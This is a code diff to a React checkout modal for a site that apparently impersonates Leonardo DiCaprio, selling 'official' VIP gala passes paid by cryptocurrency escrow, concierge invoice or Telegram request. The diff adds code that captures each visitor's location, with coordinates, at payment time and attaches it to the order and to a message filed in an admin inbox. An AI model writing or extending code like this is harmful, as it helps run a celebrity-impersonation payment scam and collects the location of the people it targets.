@@ -22,8 +22,10 @@ import {
   Check,
   Radio
 } from 'lucide-react';
-import { CartItem, LuxuryTheme, OrderRecord } from '../types';
+import { CartItem, LuxuryTheme, OrderRecord, MessageLocation, ChanneledMessage } from '../types';
 import { THEME_CONFIGS, SOCIAL_MEDIA_HANDLES } from '../data/diCaprioData';
+import { resolveLocationForOutgoingMessage, formatCoordinates } from '../services/visitorLocationService';
+import { MessageLocationTag, ComposerLocationStatusBar } from './MessageLocationTag';
 
 interface CheckoutModalProps {
   isOpen: boolean;
@@ -73,6 +75,7 @@ export function CheckoutModal({
   const [isCardFlipped, setIsCardFlipped] = useState(false);
   const [isProcessing, setIsProcessing] = useState(false);
   const [confirmationOrderNum, setConfirmationOrderNum] = useState('');
+  const [confirmedLocation, setConfirmedLocation] = useState<MessageLocation | undefined>(undefined);
 
   const themeConfig = THEME_CONFIGS[currentTheme];
 
@@ -121,6 +124,10 @@ export function CheckoutModal({
         ? 'Private Concierge Card Invoice'
         : 'Cryptocurrency Escrow (USDT / BTC / ETH)';
 
+    const locationLine = confirmedLocation
+      ? `\n\n📍 Individual Location: ${confirmedLocation.label} (${formatCoordinates(confirmedLocation.lat, confirmedLocation.lng)})`
+      : '';
+
     return `🏛️ [LEONARDO DICAPRIO OFFICIAL VIP PASS ORDER]
 Order Reference: ${orderNum}
 Attendee Name: ${attendeeName}
@@ -134,7 +141,7 @@ Total Amount Due: $${total.toLocaleString()} USD
 Venue: 88th Academy Laureate Gala & Cannes Premiere 2026
 Concierge / Seating Notes: ${attendeeNotes || 'Premier Gala Access'}
 
-Requesting official concierge verification approval and provision of official means of payment.`;
+Requesting official concierge verification approval and provision of official means of payment.${locationLine}`;
   };
 
   const handleCopySummary = () => {
@@ -144,29 +151,32 @@ Requesting official concierge verification approval and provision of official me
     setTimeout(() => setCopiedSummary(false), 3500);
   };
 
-  const handleProcessPayment = (e: React.FormEvent) => {
+  const handleProcessPayment = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsProcessing(true);
+
+    const visitorLocation = await resolveLocationForOutgoingMessage();
+    setConfirmedLocation(visitorLocation);
 
     setTimeout(() => {
       setIsProcessing(false);
       const generatedId = `LD-2026-VIP-${Math.floor(100000 + Math.random() * 900000)}`;
       setConfirmationOrderNum(generatedId);
 
-      // Create rich OrderRecord
+      const orderSummaryItems = cartItems.map((ci) => ({
+        itemId: ci.item.id,
+        title: ci.item.title,
+        subtitle: ci.item.subtitle,
+        tier: ci.item.tier,
+        image: ci.item.image,
+        price: ci.item.price,
+        quantity: ci.quantity,
+      }));
+
+      const isGold = cartItems.some((ci) => ci.item.tier === 'Gold');
+
+      // Create rich OrderRecord with attached individual location
       if (onOrderPlaced) {
-        const orderSummaryItems = cartItems.map((ci) => ({
-          itemId: ci.item.id,
-          title: ci.item.title,
-          subtitle: ci.item.subtitle,
-          tier: ci.item.tier,
-          image: ci.item.image,
-          price: ci.item.price,
-          quantity: ci.quantity,
-        }));
-
-        const isGold = cartItems.some((ci) => ci.item.tier === 'Gold');
-
         const newOrder: OrderRecord = {
           id: `ord-${Date.now()}`,
           orderNumber: generatedId,
@@ -191,14 +201,56 @@ Requesting official concierge verification approval and provision of official me
           venueDate: 'May 24, 2026 · Grand Théâtre Lumière & Hotel du Cap',
           seatZone: isGold ? 'Gold Luminary Greenroom & Front Orchestra' : 'Silver Red Carpet Orchestra',
           qrCodeSerial: `AMPAS-REG-${generatedId}`,
+          location: visitorLocation,
         };
 
         onOrderPlaced(newOrder);
       }
 
+      // Also channel VIP reservation request to Admin Portal Inbox with individual location attached
+      try {
+        const itemsSummary = orderSummaryItems
+          .map((i) => `${i.title} x${i.quantity} ($${(i.price * i.quantity).toLocaleString()})`)
+          .join(', ');
+        const channeledVipRequest: ChanneledMessage = {
+          id: `msg-vip-${Date.now()}`,
+          senderName: attendeeName.trim() || 'VIP Patron',
+          senderContact: attendeeEmail.trim() || telegramUsername.trim() || 'VIP Checkout Desk',
+          category: 'vip_inquiry',
+          subject: `VIP Reservation Request #${generatedId}`,
+          message: `Passes: ${itemsSummary || 'VIP Gala Credentials'}\nTotal: $${total.toLocaleString()} USD\nPayment Preference: ${paymentPreference}\nNotes: ${attendeeNotes || 'Premier Gala Access'}`,
+          timestamp: new Date().toLocaleString([], {
+            month: 'short',
+            day: 'numeric',
+            hour: '2-digit',
+            minute: '2-digit',
+          }),
+          status: 'unread',
+          location: visitorLocation,
+        };
+        const stored = localStorage.getItem('ld_owner_channeled_messages');
+        const currentList: ChanneledMessage[] = stored ? JSON.parse(stored) : [];
+        localStorage.setItem(
+          'ld_owner_channeled_messages',
+          JSON.stringify([channeledVipRequest, ...currentList])
+        );
+        const userMsgIds: string[] = JSON.parse(
+          localStorage.getItem('ld_user_submitted_message_ids') || '[]'
+        );
+        localStorage.setItem(
+          'ld_user_submitted_message_ids',
+          JSON.stringify([channeledVipRequest.id, ...userMsgIds])
+        );
+        window.dispatchEvent(
+          new CustomEvent('new-channeled-message', { detail: channeledVipRequest })
+        );
+      } catch {
+        // ignore storage failures
+      }
+
       setStep('confirmation');
       onClearCart();
-    }, 1200);
+    }, 900);
   };
 
   const getCardType = (num: string) => {
@@ -682,6 +734,8 @@ Requesting official concierge verification approval and provision of official me
                   </div>
                 </div>
 
+                <ComposerLocationStatusBar compact />
+
                 {/* Submit to Telegram Button */}
                 <button
                   type="submit"
@@ -865,6 +919,12 @@ Requesting official concierge verification approval and provision of official me
                   Valid for 2025/2026 Season
                 </span>
               </div>
+
+              {confirmedLocation && (
+                <div className="mt-4 pt-3 border-t border-white/10">
+                  <MessageLocationTag location={confirmedLocation} />
+                </div>
+              )}
             </div>
 
             {/* Bottom Actions */}
